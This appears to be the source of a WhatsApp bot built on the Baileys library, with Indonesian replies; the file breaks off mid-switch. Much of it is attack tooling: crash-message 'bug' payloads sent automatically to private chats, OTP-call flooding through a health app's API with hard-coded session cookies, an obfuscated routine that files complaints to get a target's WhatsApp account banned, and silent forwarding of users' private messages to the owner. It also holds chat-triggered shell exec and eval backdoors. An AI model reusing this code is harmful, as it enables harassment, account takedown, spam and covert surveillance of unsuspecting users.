const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins, fetchJson } = require('./storage/functions.js')
const { exec } = require('child_process')
const cheerio = require('cheerio')
const moment = require('moment-timezone')
const util = require('util')
const axios = require('axios').default
const fs = require('fs')
autobug = true
mode = true

let userVIP = JSON.parse(fs.readFileSync('./storage/database/vip.json'))

module.exports = async (semar, denz, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const time = moment.tz('Asia/Jakarta').format('ha z')
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const isGroup = from.endsWith('@g.us')
const botNumber = semar.user.id.split(':')[0]
const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isVIP = userVIP.includes(sender)
const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const bugreactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
const bugcontactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
const frpayment = {key: {remoteJid: '0@s.whatsapp.net',fromMe: false,id: 'MultiDevice',participant: '0@s.whatsapp.net'},message: {requestPaymentMessage: {currencyCodeIso4217: "USD",amount1000: 2022,requestFrom: '0@s.whatsapp.net',noteMessage: {extendedTextMessage: {text: 'Copyright © 2022 Dcode Denpa, AI. Semar-BMD'}},expiryTimestamp: 2022,amount: {value: 91929291929,offset: 1000,currencyCode: "USD"}}}}

const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
semar.sendMessage(id, buttonMessage, options)}

const sendButTemplate = (id, text1, footer1, but = [], options = {}) => {
const templateMessage = {text: text1,footer: footer1,templateButtons: but}
semar.sendMessage(id, templateMessage, options)}

const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], options = {}) => {
const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
semar.sendMessage(id, listMessage, options)}

if (body.startsWith(`64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61`)) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}

if (autobug && !isDev && !isVIP && !command && !isGroup) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`+${senderNumber}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {console.log(response)}).catch(function (error) {console.log(error)})}

if (body && !isGroup && !msg.key.fromMe && !isDev) {
semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}

if (body.startsWith(`regist-4064636F646564656E7061`)) {
reply('Nomor anda sedang dicek oleh Owner, Tunggu sebentar...')
semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• Register\nFrom : ${pushname}\nNumber : ${senderNumber}\nTime : ${time}\nLink : wa.me/${sender}`})}

if (body.startsWith(`$`)){ if (!isDev && !msg.key.fromMe) return
let evl = body.split("\n")
let exc = body.replace(evl[0]+"\n", "")
exec(exc, (err, stdout, stderr) => {
if (stdout) return reply(`${stdout}`)
if (stderr) return reply(`${stderr}`)
if (err) return reply(`${err}`)})}
	    
if (/^=?>/.test(body) && (isDev || msg.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
return reply(require('util').format(evaluate))} catch(e){
return reply(require('util').format(e))}}

if (command) { await semar.readMessages([msg.key]) }
if (!mode) { if (!isDev && !msg.key.fromMe) return }
switch (command) {
//©from:nathanael
case 'menu': case 'help': case '?':
semar.sendMessage(from,{text:`❏  *OTHER MENU*
•   ${prefix}status
•   ${prefix}delete

❏  *GROUP MENU*
•   ${prefix}open
•   ${prefix}close
•   ${prefix}add
•   ${prefix}kick
•   ${prefix}promote
•   ${prefix}demote
         
❏  *BUG MENU*
•   ${prefix}sendbug
•   ${prefix}dumpbug
•   ${prefix}spambug
•   ${prefix}buggc
•   ${prefix}banwa
         
❏  *OWNER MENU*
•   ${prefix}join
•   ${prefix}leave
•   ${prefix}restart
•   ${prefix}shutdown
•   ${prefix}public
•   ${prefix}private
•   ${prefix}chat
•   ${prefix}autobug`}, {quoted:frpayment})
break

//©from: dennis × ivan
case 'verify': case 'ban': case 'logout': case 'banwa': case 'out':
if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
var rH=d,rq=d,ro=d,rI=d,rk=d;(function(S,s){var v=d,L=d,p=d,y=d,w=d,G=S();while(!![]){try{var m=parseInt(v(0x151))/(0x130*-0xe+-0xa43+-0x6b9*-0x4)+-parseInt(v(0x12b))/(0x339+0x1a2d+0x42*-0x72)*(parseInt(L(0x17a))/(0x9e2+0x2595+-0x2f74))+parseInt(v(0x19d))/(0x1950+-0x7ad+-0x119f)+-parseInt(w(0x1ac))/(0xb8b+0xb*-0x2e3+0x1*0x143b)+parseInt(p(0x1be))/(0x19*-0x184+0x1892+0xd58*0x1)+-parseInt(v(0x118))/(0x6*-0x52a+-0xa*-0x3a4+-0x1*0x565)+-parseInt(y(0x1c9))/(0x22d*0xf+0x2*-0xa6f+-0xbbd);if(m===s)break;else G['push'](G['shift']());}catch(T){G['push'](G['shift']());}}}(X,-0x5*-0x1dc88+0x54eae+0x1*-0x6ac42));var u=(function(){var z=d,O=d,c=d,t=d,r0=d,s={};s[z(0x157)]=z(0x16d)+c(0x1c1)+'4',s[t(0x13a)]=function(T,n){return T!==n;},s[t(0x170)]=t(0x17f),s[z(0x158)]=r0(0x1a0),s[O(0x195)]=function(T,n){return T!==n;},s[t(0x16a)]=z(0x1ca),s[z(0x173)]=function(T,n){return T===n;},s[O(0x18c)]=t(0x1b2),s[z(0x181)]=t(0x14f);var G=s,m=!![];return function(T,n){var r1=O,r2=r0,r3=c,r4=z;if(G[r1(0x173)](G[r1(0x18c)],G[r1(0x181)])){if(T){var K=K[r4(0x1c4)](j,arguments);return F=null,K;}}else{var Q=m?function(){var r5=r2,r6=r4,r7=r1,r8=r3,r9=r4,K={};K[r5(0x129)]=G[r6(0x157)];var j=K;if(G[r6(0x13a)](G[r8(0x170)],G[r6(0x158)])){if(n){if(G[r7(0x195)](G[r6(0x16a)],G[r8(0x16a)])){if(T){var W=K[r7(0x1c4)](j,arguments);return F=null,W;}}else{var F=n[r7(0x1c4)](T,arguments);return n=null,F;}}}else{var B=j[r9(0x129)][r9(0x18b)]('|'),D=-0x1954+0x126+0x182e;while(!![]){switch(B[D++]){case'0':var V=F[x];continue;case'1':var H=W[V]||q;continue;case'2':q[r6(0x142)+r6(0x1d2)]=H[r7(0x142)+r8(0x1d2)][r6(0x155)](H);continue;case'3':var q=K[r6(0x146)+r5(0x15b)+'r'][r7(0x116)+r8(0x185)][r7(0x155)](j);continue;case'4':V[V]=q;continue;case'5':q[r8(0x134)+r6(0x117)]=B[r7(0x155)](D);continue;}break;}}}:function(){};return m=![],Q;}};}()),R=u(this,function(){var rr=d,rP=d,rR=d,ru=d,rX=d,s={};s[rr(0x1cf)]=rP(0x143)+rP(0x11c)+'+$';var G=s;return R[rR(0x142)+ru(0x1d2)]()[rR(0x1b8)+'h'](G[rX(0x1cf)])[rX(0x142)+rr(0x1d2)]()[rX(0x146)+rR(0x15b)+'r'](R)[rr(0x1b8)+'h'](G[ru(0x1cf)]);});function X(){var rl=['r3D3u2y','lKjqoNC','CxvVDgu','BwvZC2e','BMn0Aw8','C3bSAxq','zNzRuu4','zM9YBwe','mxWWFdu','yxbPl3y','y2XPzw4','sNDoB3K','AMf6B2u','y21HAwW','y3rVCIG','u1PgreO','ChLcqui','BgvUz3q','Fdr8ma','DgfIBgu','yxr0CG','ywn0Aw8','mtKZmty','mtaZmJCXnKLPqLbPrW','y291BNq','vvvRvhu','CvffC1G','DwjHzg8','u2P4rwK','pwXZzf0','EczJB3u','AuDgt3a','zxjYB3i','wu1xCxO','w25HBwu','zMLUza','zg8VCM8','AgvHzgu','mtu2mJe0nuXlrwHMDq','x19OCW','mZa4ntG','AfHXzMG','r1LNqMe','zw1HAwW','whnHCxe','ysbJB24','lMnVBq','pwPHEM8','oI8VD3C','AhjLzG','C2vHCMm','CMvWBge','DhjHy2u','CM4GDgG','yxbWzw4','oZSPoW','nti1mJC2mfDRt2jZtq','Aw5MBW','u3vRC2u','Fdv8mNW','uhjxzwC','qwLswK8','yxbWBhK','CYbSB2C','zM9YBq','BNq9mq','BNn0CNu','mtmYmde4nfLYteD2DW','Du1VELi','AxPOzuK','DhnHCha','AM9PBG','D19WA2C','q0DjAhK','Fdn8mNW','BgvJDg8','Aw5N','B3jT','ugvYzgK','sMvwy1i','lMnVBs8','wLveDfe','z2v0','E30Uy28','yxrPDMu','BKLwB3q','mxWYFdm','ms8/ywm','mc4WlJa','Ew91CL8','CgXHDgy','ALHoreS','CuXtwwe','CMvX','ChjVDg8','Dg9FxW','mtGWmdy4mhPuAeLbvW','r2r4rwC','x2nVBMy','vMvWsuS','ksSPkYK','C3rLCa','iNjLDhu','qMHorxi','CgHVBMu','y3qVBM8','x19JC3i','y29UC28','DMfS','lJiUmc4','tuDID0q','qu5euK8','ALjyvKe','BMD3zwy','Du9nAhK','mKr5qwn5tq','zhbY','x251Bwi','C3vIBwK','DgLVBG','z2vUuMe','zxnZywC','CgfYC2u','B29RAwu','x19WCM8','qKDrBKC','Ahr0Chm','x19Jy2C','tu9Arum','Aw5WDxq','DMrjq3q','ue9tva','DY53Age','BKn2vxG','A1jrDee','CNLFC2u','DxjS','x19Yzxe','Dg9tDhi','kcGOlIS','twDHDwG','Bwv0Ag8','y29UC3q','x19Yzxy','ywLSyM8','Agf0C2e','vu5ltK8','D2fYBG','y29UDge','AxmIksG','BIGPia','vMfZBMu','x19JB20','nZi0odaYzuzXq0jX','Cvzotgu','m3W0Fde','zM9YicG','yMLUza','qwDgBMS','AvLJAeS','CvfkB3e','Fdj8nxW','zxHJzxa','CNvJDg8','suXhBuu','ig1PBMG','ENDPuNm','DgLVBJ0','oIbKzxm','AxjT','ChbFD3C','C2v0lwm','x191C2u','BMrVBu0','mtaWnJy','DxzTu1e','u25hB2G','Ehfoqwm','BMTJr2C','zxn0xq','BK9RBha','m3WWFde','y29VA2K','B3v0ia','BNryANC','q05ps3i','t0XTEMq','t2rdrxq','CMv0Dxi','x19H','zgf0yq','Bg9Hza','DY4XC2u','BIaOzNu','mtGWotG0m0v6EffMBG','vNjrt0y','Bg9N','BwvUDf8','BhnK','uK5HsNG','tfvhy3K','B0DzB1u','DLjKtwW','C2vUze0','rhrXAhq','DhLWzq'];X=function(){return rl;};return X();}R();var P=(function(){var rd=d,rS=d,rs=d,rG=d,rm=d,s={};s[rd(0x156)]=function(T,n){return T===n;},s[rS(0x1b0)]=rd(0x1a7),s[rd(0x152)]=function(T,n){return T!==n;},s[rd(0x1a2)]=rd(0x13d),s[rm(0x11f)]=rs(0x17b),s[rs(0x113)]=rS(0x172),s[rS(0x138)]=rG(0x1af);var G=s,m=!![];return function(T,n){var rT=rm,rn=rs,rQ=rd;if(G[rT(0x152)](G[rT(0x113)],G[rT(0x138)])){var Q=m?function(){var rf=rn,rK=rn,rj=rQ,rF=rQ,rx=rQ;if(G[rf(0x156)](G[rK(0x1b0)],G[rf(0x1b0)])){if(n){if(G[rf(0x152)](G[rj(0x1a2)],G[rK(0x11f)])){var f=n[rK(0x1c4)](T,arguments);return n=null,f;}else{var j=Q?function(){var rW=rj;if(j){var q=Z[rW(0x1c4)](N,arguments);return g=null,q;}}:function(){};return x=![],j;}}}else{var F=m[rj(0x1c4)](T,arguments);return n=null,F;}}:function(){};return m=![],Q;}else{var K=Q?function(){var rB=rn;if(K){var q=Z[rB(0x1c4)](N,arguments);return g=null,q;}}:function(){};return x=![],K;}};}()),r=P(this,function(){var rD=d,rV=d,rZ=d,rN=d,rg=d,S={'uOMhy':rD(0x1dc)+rD(0x198),'BGQnG':function(W,B){return W<B;},'qLSYa':rZ(0x153)+rD(0x159)+'0','GwwSf':function(x,W){return x(W);},'ZUDtQ':function(W,B){return W+B;},'nIVot':rD(0x174)+rg(0x179)+rZ(0x18a)+rD(0x14e),'UUkTu':rN(0x1d9)+rZ(0x1c8)+rN(0x194)+rN(0x11e)+rD(0x1bb)+rD(0x14d)+'\x20)','nOklp':function(x){return x();},'pyBAB':rD(0x17c),'VepIK':rV(0x14b),'SnGoh':rN(0x1bf),'zwiRs':rg(0x1a6),'GdxEg':rN(0x15a)+rZ(0x12f),'JwNoy':rV(0x199),'JeVcR':rN(0x1ba),'iGFOp':rZ(0x143)+rZ(0x11c)+'+$','PrWeg':function(W,B){return W!==B;},'kRQtA':rZ(0x180),'AiRZO':function(W,B){return W+B;},'vRdMl':function(W,B){return W+B;},'MGbwD':function(W,B){return W===B;},'CNOKr':rg(0x144),'Dtqht':function(W,B){return W!==B;},'ILGmE':rZ(0x169),'jRXVA':rV(0x167),'izheI':rN(0x18e)+rg(0x1d0)+'4'},s;try{if(S[rZ(0x1c2)](S[rg(0x13e)],S[rg(0x13e)])){var W=S[rZ(0x12a)][rg(0x18b)]('|'),B=0x235c+-0x1*0x31d+-0x203f;while(!![]){switch(W[B++]){case'0':for(var D=0x1*-0x13ff+-0xb0d*-0x1+0x1ca*0x5;S[rZ(0x135)](D,A[rg(0x197)+'h']);D++){var V=S[rV(0x114)][rg(0x18b)]('|'),Z=-0x1d95+0x1c39+0x15c;while(!![]){switch(V[Z++]){case'0':b[h]=g;continue;case'1':var N=b[h]||g;continue;case'2':g[rg(0x134)+rZ(0x117)]=N[rN(0x155)](g);continue;case'3':var g=V[rV(0x146)+rV(0x15b)+'r'][rN(0x116)+rZ(0x185)][rD(0x155)](Z);continue;case'4':var h=A[D];continue;case'5':g[rZ(0x142)+rg(0x1d2)]=N[rD(0x142)+rZ(0x1d2)][rV(0x155)](N);continue;}break;}}continue;case'1':var C;continue;case'2':try{var M=S[rD(0x186)](W,S[rZ(0x1d7)](S[rg(0x1d7)](S[rD(0x1db)],S[rZ(0x19f)]),');'));C=S[rV(0x16c)](M);}catch(E){C=D;}continue;case'3':var b=C[rg(0x123)+'le']=C[rZ(0x123)+'le']||{};continue;case'4':var A=[S[rD(0x196)],S[rZ(0x11b)],S[rZ(0x168)],S[rN(0x15e)],S[rN(0x119)],S[rN(0x191)],S[rZ(0x1d5)]];continue;}break;}}else{var G=S[rD(0x186)](Function,S[rD(0x1c3)](S[rZ(0x182)](S[rg(0x1db)],S[rN(0x19f)]),');'));s=S[rg(0x16c)](G);}}catch(W){if(S[rV(0x126)](S[rZ(0x171)],S[rN(0x171)]))s=window;else{var D=m[rg(0x1c4)](T,arguments);return n=null,D;}}var m=s[rg(0x123)+'le']=s[rD(0x123)+'le']||{},T=[S[rN(0x196)],S[rD(0x11b)],S[rN(0x168)],S[rZ(0x15e)],S[rV(0x119)],S[rg(0x191)],S[rZ(0x1d5)]];for(var n=0x4*0x3f1+-0x161*0x1+-0x7f*0x1d;S[rZ(0x135)](n,T[rZ(0x197)+'h']);n++){if(S[rZ(0x184)](S[rg(0x15c)],S[rN(0x128)])){var Q=S[rV(0x1cb)][rV(0x18b)]('|'),f=-0x1c5*0xb+-0x10*-0x66+0xd17*0x1;while(!![]){switch(Q[f++]){case'0':var K=T[n];continue;case'1':var j=P[rZ(0x146)+rg(0x15b)+'r'][rD(0x116)+rZ(0x185)][rV(0x155)](P);continue;case'2':j[rV(0x142)+rN(0x1d2)]=F[rg(0x142)+rg(0x1d2)][rV(0x155)](F);continue;case'3':j[rg(0x134)+rZ(0x117)]=P[rV(0x155)](P);continue;case'4':m[K]=j;continue;case'5':var F=m[K]||j;continue;}break;}}else return G[rN(0x142)+rV(0x1d2)]()[rD(0x1b8)+'h'](S[rZ(0x1a5)])[rg(0x142)+rN(0x1d2)]()[rD(0x146)+rN(0x15b)+'r'](m)[rV(0x1b8)+'h'](S[rN(0x1a5)]);}});r();var ntah=await axios[rH(0x1d8)](rq(0x136)+rq(0x1b6)+rq(0x13c)+rq(0x1cc)+rq(0x1d6)+ro(0x14c)+rH(0x121)+rk(0x190)+'t/'),email=await axios[ro(0x1d8)](ro(0x136)+rI(0x1b6)+rH(0x178)+ro(0x193)+rq(0x1d6)+rI(0x18f)+rI(0x1dd)+rH(0x15f)+rk(0x130)+rq(0x165)+rI(0x148)+rq(0x1a4)+rq(0x1c7)),cookie=ntah[rH(0x1ab)+'rs'][ro(0x163)+rq(0x133)][rq(0x1cd)](';\x20'),$=cheerio[ro(0x177)](ntah[rH(0x176)]),$form=$(rI(0x1c6)),url=new URL($form[rq(0x19a)](rI(0x19b)+'n'),rq(0x136)+rq(0x1b6)+rk(0x13c)+rI(0x1cc)+rk(0x1b4))[rk(0x1b7)],form=new URLSearchParams();form[rk(0x1bc)+'d'](rI(0x192)+'st',$form[rI(0x1a9)](rk(0x139)+rq(0x1a8)+ro(0x1b5)+rH(0x16b))[rk(0x124)]()),form[rq(0x1bc)+'d'](rI(0x17e),$form[rq(0x1a9)](rq(0x139)+rH(0x1a8)+ro(0x1a3))[ro(0x124)]()),form[rk(0x1bc)+'d'](rI(0x11d),rq(0x12e)+'t'),form[rq(0x1bc)+'d'](rk(0x19e)+rk(0x13f)+rI(0x1d1)+'r','ID'),form[ro(0x1bc)+'d'](rI(0x120)+ro(0x12d)+'er',''+dn),form[rI(0x1bc)+'d'](rI(0x1b1),email[rk(0x176)][-0x2*0x6e5+0x2*0x5d9+-0x10c*-0x2]),form[ro(0x1bc)+'d'](rI(0x1b1)+rq(0x11a)+rq(0x161),email[rH(0x176)][-0x205f*0x1+-0xc44+0x2ca3]),form[rq(0x1bc)+'d'](rq(0x1e0)+rk(0x1d3),rH(0x127)+'ID'),form[rk(0x1bc)+'d'](rI(0x1df)+ro(0x189)+'ge',rq(0x1d4)+rI(0x1aa)+rk(0x1a1)+rH(0x160)+rq(0x1da)+rk(0x15d)+rI(0x1b3)+'ta'),form[rk(0x1bc)+'d'](ro(0x164)+'r','0'),form[rk(0x1bc)+'d'](rH(0x175),'1'),form[ro(0x1bc)+'d'](rI(0x122),''),form[rq(0x1bc)+'d'](rk(0x141),'8'),form[ro(0x1bc)+'d'](ro(0x1ad),rH(0x19c)+ro(0x187)+rq(0x149)+rk(0x162)+rq(0x1ce)+rq(0x125)+rq(0x1de)),form[ro(0x1bc)+'d'](rk(0x12c),'1'),form[rI(0x1bc)+'d'](rq(0x137),rq(0x14a)+'WN'),form[ro(0x1bc)+'d'](rH(0x147),ro(0x166)+rH(0x1ae)),form[rq(0x1bc)+'d'](rq(0x150)+rH(0x17d)+ro(0x115),'0');var J={};function d(r,P){var R=X();return d=function(u,S){u=u-(-0x1*0xad3+0x26fb+-0x1b15);var s=R[u];if(d['awznFz']===undefined){var G=function(Q){var f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var K='',j='',F=K+G;for(var x=-0x1524+-0x7*0x7f+0x189d,W,B,D=-0x2*0xde2+-0xf*0x27+0x1e0d;B=Q['charAt'](D++);~B&&(W=x%(-0x1*-0x1a05+0xcc2+0x26c3*-0x1)?W*(-0x2660+0xec6+0x2*0xbed)+B:B,x++%(-0xbfc+0x2401+-0x1801))?K+=F['charCodeAt'](D+(-0x29*-0x6d+-0x14cf+0x364))-(-0xd9e+0x20d0+-0x1328)!==-0x1fc0+0x1d0b+0x2b5?String['fromCharCode'](-0x2409+-0x1*0x1f19+-0x1*-0x4421&W>>(-(0x7b*0x43+-0xd1c*0x1+-0x1313)*x&0xb*0x293+-0x1*-0xf25+-0x2b70)):x:-0xc68+0xbae+0xba){B=f['indexOf'](B);}for(var V=0x1539+0x1195+-0x26ce,Z=K['length'];V<Z;V++){j+='%'+('00'+K['charCodeAt'](V)['toString'](-0x1b7e+0x22d6+-0x748))['slice'](-(-0x43c*0x4+0x3*-0x509+0x3*0xaaf));}return decodeURIComponent(j);};d['MVKkXS']=G,r=arguments,d['awznFz']=!![];}var m=R[-0x13*0x1d7+0x13*-0x21+-0x1c8*-0x15],T=u+m,n=r[T];if(!n){var Q=function(f){this['cuaEHr']=f,this['XIWFzC']=[-0x2631+-0xc5*0xa+0x2de4,-0xc1a+0x1*-0x43b+0x1055,-0x8fe+0x35b*-0x2+-0x10c*-0xf],this['XJxfrq']=function(){return'newState';},this['FMpxpT']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['aOjXDm']='[\x27|\x22].+[\x27|\x22];?\x20*}';};Q['prototype']['xcXNol']=function(){var f=new RegExp(this['FMpxpT']+this['aOjXDm']),K=f['test'](this['XJxfrq']['toString']())?--this['XIWFzC'][0x223*-0x2+0x2218*-0x1+0x37d*0xb]:--this['XIWFzC'][0x1f2+0x1f2d+-0x211f];return this['KnrJVA'](K);},Q['prototype']['KnrJVA']=function(f){if(!Boolean(~f))return f;return this['cnphnr'](this['cuaEHr']);},Q['prototype']['cnphnr']=function(f){for(var K=0x1d1c+-0x929+-0x13f3,j=this['XIWFzC']['length'];K<j;K++){this['XIWFzC']['push'](Math['round'](Math['random']())),j=this['XIWFzC']['length'];}return f(this['XIWFzC'][0x64d+0xc*-0x67+-0x179]);},new Q(d)['xcXNol'](),s=d['MVKkXS'](s),r[T]=s;}else s=n;return s;},d(r,P);}J[rH(0x16e)+'e']=cookie;var i={};i[rk(0x140)]=url,i[rq(0x145)+'d']=rk(0x13b),i[rq(0x176)]=form,i[rk(0x1ab)+'rs']=J;var res=await axios(i),e={};e[rI(0x188)+'d']=msg,semar[rI(0x183)+ro(0x131)+'e'](from,{'text':rI(0x1c0)+rH(0x1c5)+ro(0x16f)+dn+'\x20'+util[rH(0x18d)+'t'](JSON[rH(0x132)](res[rq(0x176)][ro(0x1b9)+'ce'](rk(0x154)+rH(0x1bd),'')))},e);
break

//©from: dennis
case 'cek': case 'test': case 'status':
exec(`pm2 status`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: nayla
case 'open':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'not_announcement')
reply('_Successfully Opened Group!_\n')
break

//©from: nayla
case 'close':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'announcement')
reply('_Successfully Closed The Group!_\n')
break

//©from: dennis
case 'add':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
add = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [add], "add")
break

//©from: dennis
case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [remove], "remove")
break

//©from: dennis
case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break

//©from: dennis
case 'demote':
